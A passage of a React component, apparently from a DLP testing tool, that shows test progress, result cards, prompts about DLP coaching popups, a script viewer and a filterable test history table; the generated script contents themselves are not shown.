              <div className="rounded-xl border border-border-strong bg-card/50 p-5 flex items-start gap-3 shadow-sm">
                <Loader2 className="h-5 w-5 text-muted-foreground animate-spin shrink-0 mt-0.5" />
                <div>
                  <p className="text-sm font-semibold text-foreground">Test in progress…</p>
                  <p className="text-xs text-muted-foreground/80 mt-0.5">If DLP intercepts this request, it will never arrive at our server and the test will time out or fail.</p>
                  {slowTest && (
                    <p className="text-xs text-amber-400 mt-2 font-medium">
                      Taking longer than usual — if a DLP coaching or justify popup appeared, interact with it. The result will be recorded automatically.
                    </p>
                  )}
                </div>
              </div>
            )}

            {runResult && !isRunning && (() => {
              const m = RESULT_META[runResult.status]
              const { Icon } = m
              return (
                <>
                  <div className={cn('rounded-xl border p-5', m.border, m.bg)}>
                    <div className="flex items-start gap-3">
                      <Icon className={cn('h-6 w-6 shrink-0 mt-0.5', m.color)} />
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 mb-1">
                          <span className={cn('text-xs font-bold uppercase tracking-widest', m.color)}>{m.label}</span>
                          {runResult.responseMs != null && (
                            <span className="text-[10px] text-muted-foreground/60 tabular-nums">{runResult.responseMs}ms</span>
                          )}
                          {runResult.responseCode != null && (
                            <span className="text-[10px] font-mono bg-muted text-muted-foreground px-1.5 py-0.5 rounded">HTTP {runResult.responseCode}</span>
                          )}
                          {runResult.proxyDetected && (
                            <span className="text-[10px] font-medium px-1.5 py-0.5 rounded bg-amber-500/15 text-amber-400">DLP proxy headers detected</span>
                          )}
                        </div>
                        <p className="text-sm font-semibold text-foreground">{m.headline}</p>
                        <p className="text-xs text-muted-foreground mt-1">{m.sub}</p>
                        {/* Subtle link to show alert prompt if user missed the auto-trigger */}
                        {!showAlertPrompt && (runResult.status === 'not_blocked' || runResult.status === 'blocked') && lastResultId && (
                          <button
                            onClick={() => setShowAlertPrompt(true)}
                            className="mt-2 text-[10px] text-muted-foreground/60 hover:text-muted-foreground underline transition-colors"
                          >
                            Did a DLP coaching or justify popup appear?
                          </button>
                        )}
                        {runResult.serverData && (
                          <div className="mt-3 bg-card/60 rounded-lg p-3 border border-border-strong">
                            <p className="text-[9px] font-bold text-muted-foreground/60 uppercase tracking-widest mb-1.5">Server confirmation</p>
                            <pre className="text-[10px] text-muted-foreground font-mono overflow-x-auto">{JSON.stringify(runResult.serverData, null, 2)}</pre>
                          </div>
                        )}
                      </div>
                    </div>
                  </div>

                  {/* User alert confirmation prompt — split by initial result */}
                  {showAlertPrompt && lastResultId && lastInitialResult === 'not_blocked' && (
                    <div className="rounded-xl border border-amber-500/30 bg-amber-500/5 p-4">
                      <p className="text-xs font-semibold text-amber-500 mb-1">Did a DLP popup appear during this test?</p>
                      <p className="text-[10px] text-muted-foreground/80 mb-3">The request got through, but the delay suggests a coaching popup may have appeared first:</p>
                      <div className="flex items-center gap-2 flex-wrap">
                        <button
                          onClick={async () => {
                            await updateTestResultUserAlert(lastResultId, 'user_alert_proceed')
                            setRunResult(prev => prev ? { ...prev, status: 'user_alert_proceed' } : prev)
                            setHistory(prev => prev.map(e => e.id === lastResultId ? { ...e, result: 'user_alert_proceed' } : e))
                            setShowAlertPrompt(false)
                          }}
                          className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-amber-500/20 hover:bg-amber-500/30 border border-amber-500/40 text-amber-500 text-xs font-semibold transition-colors"
                        >
                          Coaching popup — I clicked Proceed
                        </button>
                        <button
                          onClick={() => setShowAlertPrompt(false)}
                          className="px-3 py-1.5 rounded-lg bg-muted hover:bg-accent text-muted-foreground text-xs font-medium transition-colors"
                        >
                          No popup — allow as-is
                        </button>
                      </div>
                    </div>
                  )}

                  {showAlertPrompt && lastResultId && lastInitialResult === 'blocked' && (
                    <div className="rounded-xl border border-border-strong/40 bg-muted/40 p-4">
                      <p className="text-xs font-semibold text-foreground/70 mb-1">Did a DLP popup appear before the block?</p>
                      <p className="text-[10px] text-muted-foreground/80 mb-3">The test was slow — if a popup appeared, tell us which type so we can record the correct outcome:</p>
                      <div className="flex items-center gap-2 flex-wrap">
                        <button
                          onClick={async () => {
                            await updateTestResultUserAlert(lastResultId, 'blocked_coached')
                            setRunResult(prev => prev ? { ...prev, status: 'blocked_coached' } : prev)
                            setHistory(prev => prev.map(e => e.id === lastResultId ? { ...e, result: 'blocked_coached' } : e))
                            setShowAlertPrompt(false)
                          }}
                          className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-orange-500/20 hover:bg-orange-500/30 border border-orange-500/40 text-orange-300 text-xs font-semibold transition-colors"
                        >
                          Block notification (OK only)
                        </button>
                        <button
                          onClick={async () => {
                            await updateTestResultUserAlert(lastResultId, 'user_alert_stop')
                            setRunResult(prev => prev ? { ...prev, status: 'user_alert_stop' } : prev)
                            setHistory(prev => prev.map(e => e.id === lastResultId ? { ...e, result: 'user_alert_stop' } : e))
                            setShowAlertPrompt(false)
                          }}
                          className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-blue-500/20 hover:bg-blue-500/30 border border-blue-500/40 text-blue-500 text-xs font-semibold transition-colors"
                        >
                          Coaching popup — I clicked Stop
                        </button>
                        <button
                          onClick={() => setShowAlertPrompt(false)}
                          className="px-3 py-1.5 rounded-lg bg-muted hover:bg-accent text-muted-foreground text-xs font-medium transition-colors"
                        >
                          No popup / silent block
                        </button>
                      </div>
                    </div>
                  )}
                </>
              )
            })()}
          </>
        )}

        {/* ─── SCRIPT VIEWER ─── */}
        {activeMode === 'script' && (
          <div className="rounded-xl border border-border bg-card/50 p-5 shadow-sm">
            <div className="flex items-start justify-between mb-4">
              <div>
                <p className="text-[10px] font-bold text-muted-foreground/80 uppercase tracking-widest mb-1">Script Generator</p>
                <h3 className="text-sm font-semibold text-foreground">{selectedScript.name}</h3>
                <p className="text-[11px] text-muted-foreground/80 mt-0.5">{selectedScript.description}</p>
              </div>
              <span className="text-[10px] font-mono bg-muted text-muted-foreground px-2 py-1 rounded shrink-0 ml-4">
                {selectedScript.protocol}
              </span>
            </div>

            {/* Data type for script */}
            <div className="mb-3">
              <label className="text-[10px] font-bold text-muted-foreground/80 uppercase tracking-widest block mb-1.5">Data Type in Script</label>
              <SearchableSelect
                options={DATA_TYPES.filter(d => d.id !== 'custom').map(d => ({ value: d.id, label: d.label }))}
                value={dataType.id}
                onChange={v => setDataType(DATA_TYPES.find(d => d.id === v) ?? DATA_TYPES[0])}
              />
            </div>

            {/* Action buttons */}
            <div className="flex items-center gap-2 mb-3">
              <button
                onClick={handleDownloadScript}
                className="flex items-center gap-1.5 px-4 py-2 rounded-lg bg-purple-600 hover:bg-purple-500 text-white text-xs font-semibold transition-colors"
              >
                <Download className="h-3.5 w-3.5" />
                Download .{selectedScript.ext}
              </button>
              <button
                onClick={handleCopyScript}
                className="flex items-center gap-1.5 px-4 py-2 rounded-lg bg-accent hover:bg-accent text-foreground/90 text-xs font-semibold transition-colors"
              >
                {copied ? <><Check className="h-3.5 w-3.5 text-green-400" /> Copied!</> : <><Copy className="h-3.5 w-3.5" /> Copy</>}
              </button>
              <span className="text-[10px] text-muted-foreground/60 ml-1">Run this script from your corporate network to test DLP controls</span>
            </div>

            {/* Script content */}
            <div className="rounded-lg border border-border-strong bg-background overflow-hidden">
              <div className="flex items-center gap-2 px-3 py-2 border-b border-border bg-card">
                <span className="w-2.5 h-2.5 rounded-full bg-red-500/60" />
                <span className="w-2.5 h-2.5 rounded-full bg-amber-500/60" />
                <span className="w-2.5 h-2.5 rounded-full bg-green-500/60" />
                <span className="text-[10px] text-muted-foreground/60 ml-2 font-mono">dlp_test_{selectedScript.id}.{selectedScript.ext}</span>
              </div>
              <pre className="text-[10px] text-foreground/70 font-mono p-4 overflow-x-auto overflow-y-auto max-h-80 leading-relaxed whitespace-pre">
                {scriptContent}
              </pre>
            </div>
          </div>
        )}

        {/* ─── TEST HISTORY ─── */}
        <HistoryTable history={history} />
      </div>
    </div>
  )
}

// ── Separate component so usePagination works cleanly ─────────────────────────

const HISTORY_BADGE: Record<string, { cls: string; label: string }> = {
  blocked:            { cls: 'bg-green-500/15 text-green-400',   label: 'Blocked' },
  not_blocked:        { cls: 'bg-red-500/15 text-red-400',       label: 'Not Blocked' },
  error:              { cls: 'bg-accent/50 text-muted-foreground',     label: 'Error' },
  user_alert_proceed: { cls: 'bg-amber-500/15 text-amber-400',   label: 'Coaching — Proceeded' },
  user_alert_stop:    { cls: 'bg-blue-500/15 text-blue-400',     label: 'Coaching — Stopped' },
  blocked_coached:    { cls: 'bg-orange-500/15 text-orange-400', label: 'Blocked — Notified' },
}

const RESULT_FILTER_OPTIONS: { value: string; label: string }[] = [
  { value: 'all',               label: 'All Results' },
  { value: 'blocked',           label: 'Blocked' },
  { value: 'not_blocked',       label: 'Not Blocked' },
  { value: 'user_alert_proceed',label: 'Coaching — Proceeded' },
  { value: 'user_alert_stop',   label: 'Coaching — Stopped' },
  { value: 'blocked_coached',   label: 'Blocked — Notified' },
  { value: 'error',             label: 'Error' },
]

const DATE_RANGE_OPTIONS = [
  { value: 'all',   label: 'All time' },
  { value: 'today', label: 'Today' },
  { value: '7',     label: 'Last 7 days' },
  { value: '30',    label: 'Last 30 days' },
]

function HistoryTable({ history }: { history: TestHistoryEntry[] }) {
  const PER_PAGE_OPTIONS = [10, 25, 50, 100]

  const [search,      setSearch]      = useState('')
  const [resultFilter,setResultFilter]= useState('all')
  const [dateRange,   setDateRange]   = useState('all')

  const filtered = useMemo(() => {
    const q = search.toLowerCase().trim()
    // eslint-disable-next-line react-hooks/purity
    const now = Date.now()
    return history.filter(e => {
      if (resultFilter !== 'all' && e.result !== resultFilter) return false
      if (dateRange === 'today') {
        const start = new Date(); start.setHours(0, 0, 0, 0)
        if (new Date(e.created_at) < start) return false
      } else if (dateRange === '7' || dateRange === '30') {
        const ms = parseInt(dateRange) * 24 * 60 * 60 * 1000
        if (now - new Date(e.created_at).getTime() > ms) return false
      }
      if (q) {
        const searchable = [
          e.test_name,
          DATA_TYPE_LABELS[e.data_type] ?? e.data_type,
          HISTORY_BADGE[e.result]?.label ?? e.result,
        ].join(' ').toLowerCase()
        if (!searchable.includes(q)) return false
      }
      return true
    })
  }, [history, search, resultFilter, dateRange])

  const pg = usePagination(filtered, 10, 'test_history')

  useEffect(() => { pg.setPage(1) }, [search, resultFilter, dateRange]) // eslint-disable-line react-hooks/exhaustive-deps

  const hasFilters = search || resultFilter !== 'all' || dateRange !== 'all'

  return (
    <div className="rounded-xl border border-border bg-card/50 p-5 shadow-sm">
      <div className="flex items-center justify-between mb-4">
        <p className="text-[10px] font-bold text-muted-foreground/80 uppercase tracking-widest">Test History</p>
        {history.length > 0 && (
          <span className="text-[10px] text-muted-foreground/60 tabular-nums">{history.length} total</span>
        )}
      </div>

      {history.length === 0 ? (
        <p className="text-sm text-muted-foreground/60 italic py-4 text-center">No tests run yet — run a web channel test above to see results here</p>
      ) : (
        <>
          {/* Filter bar */}
          <div className="flex items-center gap-2 mb-3 flex-wrap">
            <div className="relative">
              <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 w-3 h-3 text-muted-foreground/80 pointer-events-none" />
              <input
                type="text"
                value={search}
                onChange={e => setSearch(e.target.value)}
                placeholder="Search test or data type…"
                className="pl-7 pr-7 py-1.5 text-[11px] bg-muted border border-border-strong rounded-lg text-foreground/70 placeholder-muted-foreground/50 focus:outline-none focus:border-border-strong w-44"
              />
              {search && (
                <button onClick={() => setSearch('')} className="absolute right-2 top-1/2 -translate-y-1/2 text-muted-foreground/60 hover:text-muted-foreground">
                  <X className="w-3 h-3" />
                </button>
              )}
            </div>
            <select
              value={resultFilter}
              onChange={e => setResultFilter(e.target.value)}
              className="bg-muted border border-border-strong text-foreground/70 text-[11px] rounded-lg px-2 py-1.5 focus:outline-none focus:border-border-strong"
            >
              {RESULT_FILTER_OPTIONS.map(o => <option key={o.value} value={o.value}>{o.label}</option>)}
            </select>
            <select
              value={dateRange}
              onChange={e => setDateRange(e.target.value)}
              className="bg-muted border border-border-strong text-foreground/70 text-[11px] rounded-lg px-2 py-1.5 focus:outline-none focus:border-border-strong"
            >
              {DATE_RANGE_OPTIONS.map(o => <option key={o.value} value={o.value}>{o.label}</option>)}
            </select>
            {hasFilters && (
              <button
                onClick={() => { setSearch(''); setResultFilter('all'); setDateRange('all') }}
                className="text-[11px] text-muted-foreground/80 hover:text-foreground/70 transition-colors"
              >
                Clear
              </button>
            )}
            <span className="ml-auto text-[10px] text-muted-foreground/60 tabular-nums">
              {filtered.length !== history.length ? `${filtered.length} of ${history.length}` : `${history.length}`} entries
            </span>
          </div>

          {filtered.length === 0 ? (
            <div className="py-10 text-center rounded-lg border border-border">
              <p className="text-sm text-muted-foreground/80">No entries match your filters.</p>
              <button onClick={() => { setSearch(''); setResultFilter('all'); setDateRange('all') }} className="text-xs text-muted-foreground/60 hover:text-muted-foreground mt-1 transition-colors">Clear filters</button>
            </div>
          ) : (
            <div className="overflow-x-auto rounded-lg border border-border">
              <table className="w-full text-xs">
                <thead>
                  <tr className="border-b border-border">
                    {['Time', 'Test', 'Data Type', 'Result', 'Response'].map(h => (
                      <th key={h} className="text-left text-[9px] font-bold text-muted-foreground/60 uppercase tracking-wide px-3 py-2">{h}</th>
                    ))}
                  </tr>
                </thead>
                <tbody className="divide-y divide-border/60">
                  {pg.slice.map(entry => {
                    const b = HISTORY_BADGE[entry.result] ?? HISTORY_BADGE.error
                    return (
                      <tr key={entry.id} className="hover:bg-card/40 transition-colors">
                        <td className="px-3 py-2.5 whitespace-nowrap">
                          <span className="text-[10px] tabular-nums text-muted-foreground/80">{formatTime(entry.created_at)}</span>
                        </td>
                        <td className="px-3 py-2.5">
                          <span className="text-foreground/70 font-medium">{entry.test_name}</span>
                        </td>
                        <td className="px-3 py-2.5">
                          <span className="text-muted-foreground">{DATA_TYPE_LABELS[entry.data_type] ?? entry.data_type}</span>
                        </td>
                        <td className="px-3 py-2.5">
                          <span className={cn('text-[10px] font-bold px-2 py-0.5 rounded uppercase', b.cls)}>
                            {b.label}
                          </span>
                        </td>
                        <td className="px-3 py-2.5">
                          <span className="text-muted-foreground/60 tabular-nums text-[10px]">
                            {entry.response_code ? `HTTP ${entry.response_code}` : '—'}
                            {entry.response_time_ms ? ` · ${entry.response_time_ms}ms` : ''}
                          </span>
                        </td>
                      </tr>
                    )
                  })}
                </tbody>
              </table>
            </div>
          )}

          {/* Pagination footer */}
          {pg.total > pg.perPage && (
            <div className="flex items-center justify-between mt-3 pt-3 border-t border-border/60">
              <span className="text-[10px] text-muted-foreground/60 tabular-nums">
                Showing {pg.from}–{pg.to} of {pg.total}
              </span>
              <div className="flex items-center gap-3">
                <div className="flex items-center gap-1.5">
                  <button
                    onClick={() => pg.setPage(pg.page - 1)}
                    disabled={pg.page === 1}
                    className="px-2 py-1 text-[10px] rounded bg-muted text-muted-foreground hover:text-foreground hover:bg-accent disabled:opacity-30 disabled:cursor-not-allowed transition-colors"
                  >←</button>
                  <span className="text-[10px] text-muted-foreground/60 tabular-nums">{pg.page} / {pg.pages}</span>
                  <button
                    onClick={() => pg.setPage(pg.page + 1)}
                    disabled={pg.page === pg.pages}
                    className="px-2 py-1 text-[10px] rounded bg-muted text-muted-foreground hover:text-foreground hover:bg-accent disabled:opacity-30 disabled:cursor-not-allowed transition-colors"
                  >→</button>
                </div>
                <div className="flex items-center gap-1.5">
                  <span className="text-[10px] text-muted-foreground/60">Rows per page:</span>
                  <select
                    value={pg.perPage}
                    onChange={e => pg.setPerPage(Number(e.target.value))}
                    className="bg-muted border border-border-strong text-foreground/70 text-[10px] rounded px-1.5 py-0.5 focus:outline-none focus:border-border-strong"
                  >
                    {PER_PAGE_OPTIONS.map(n => <option key={n} value={n}>{n}</option>)}
                  </select>
                </div>
              </div>
            </div>
          )}
        </>
      )}
    </div>
  )
}
